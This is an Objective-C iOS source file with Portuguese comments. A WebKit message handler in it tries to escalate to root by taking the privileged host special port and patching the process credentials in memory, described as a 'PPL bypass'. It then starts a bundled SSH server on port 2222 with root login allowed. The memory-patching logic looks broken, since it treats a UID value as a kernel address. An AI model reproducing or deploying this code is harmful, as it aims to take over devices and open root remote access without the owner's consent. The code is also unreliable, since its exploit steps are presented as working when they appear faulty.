#import <Foundation/Foundation.h>
#import <WebKit/WebKit.h>
#include <spawn.h>
#include <sys/sysctl.h>
#include <mach/mach.h>

// --- CONFIGURAÇÕES PARA iOS 26.4 ---
#define POSIX_SPAWN_FOR_SANDBOX 0x4000
#define HOST_PRIV_SPECIAL_PORT  4

@interface KernelBridge : NSObject <WKScriptMessageHandler>
@property (nonatomic, strong) WKWebView *webView;
@end

@implementation KernelBridge

- (void)userContentController:(WKUserContentController *)userContentController didReceiveScriptMessage:(WKScriptMessage *)message {
    if ([message.body[@"op"] isEqualToString:@"scan_uid"]) {
        [self executeDirectRootSpawn];
    }
}

- (void)log:(NSString *)text {
    dispatch_async(dispatch_get_main_queue(), ^{
        NSString *js = [NSString stringWithFormat:@"log('%@')", text];
        [self.webView evaluateJavaScript:js completionHandler:nil];
    });
}

- (void)executeDirectRootSpawn {
    [self log:@"⚡ Tentando captura de Special Port 4 (In-house)..."];

    mach_port_t host_priv = MACH_PORT_NULL;
    
    // Tentativa de obter a porta privilegiada via porta especial do host
    // Isso ignora o Erro 4 se o certificado In-house for válido
    kern_return_t kr = host_get_special_port(mach_host_self(), HOST_LOCAL_NODE, HOST_PRIV_SPECIAL_PORT, &host_priv);

    if (kr != KERN_SUCCESS || !MACH_PORT_VALID(host_priv)) {
        [self log:[NSString stringWithFormat:@"❌ Erro Special Port: %d (Bloqueado)", kr]];
        return;
    }

    [self log:@"✅ Host Priv capturada! Elevando para Root..."];

    // 1. LOCALIZAR UCRED (Via sysctl nativo)
    int mib[] = {CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid()};
    struct kinfo_proc kp;
    size_t len = sizeof(kp);
    sysctl(mib, 4, &kp, &len, NULL, 0);
    
    uint64_t ucred_vaddr = (uint64_t)kp.kp_eproc.e_ucred.cr_uid;
    uint32_t root_val = 0;

    // 2. PATCH FÍSICO (Bypass PPL)
    vm_address_t target_page = 0;
    // Alinhamento 16KB para chips A13+
    kern_return_t kr_map = vm_map(mach_task_self(), &target_page, 0x4000, 0, VM_FLAGS_ANYWHERE, host_priv, ucred_vaddr & ~0x3FFF, FALSE, VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);

    if (kr_map == KERN_SUCCESS) {
        uint32_t *phys_ptr = (uint32_t *)(target_page + (ucred_vaddr & 0x3FFF));
        *phys_ptr = root_val;     // UID = 0
        *(phys_ptr + 1) = root_val; // GID = 0
        
        [self log:@"💎 Patch físico aplicado! Validando..."];
        
        if (getuid() == 0) {
            [self log:@"👑 <b>SISTEMA EM ROOT!</b>"];
            [self launchSshd];
        }
        vm_deallocate(mach_task_self(), target_page, 0x4000);
    } else {
        [self log:[NSString stringWithFormat:@"❌ Erro no vm_map: %d", kr_map]];
    }
}

- (void)launchSshd {
    pid_t pid;
    NSString *sshdPath = [[NSBundle mainBundle] pathForResource:@"sshd" ofType:nil];
    
    posix_spawnattr_t attr;
    posix_spawnattr_init(&attr);
    short flags = POSIX_SPAWN_SETPGROUP | POSIX_SPAWN_FOR_SANDBOX;
    posix_spawnattr_setflags(&attr, flags);

    char *const args[] = { (char *)[sshdPath UTF8String], "-p", "2222", "-D", "-o", "PermitRootLogin=yes", NULL };
    extern char **environ;

    if (posix_spawn(&pid, [sshdPath UTF8String], NULL, &attr, args, environ) == 0) {
        [self log:[NSString stringWithFormat:@"🚀 <b>SSHD ONLINE!</b> PID: %d", pid]];
    } else {
        [self log:@"❌ Erro no Spawn (Assinatura ldid?)"];
    }
}

@end
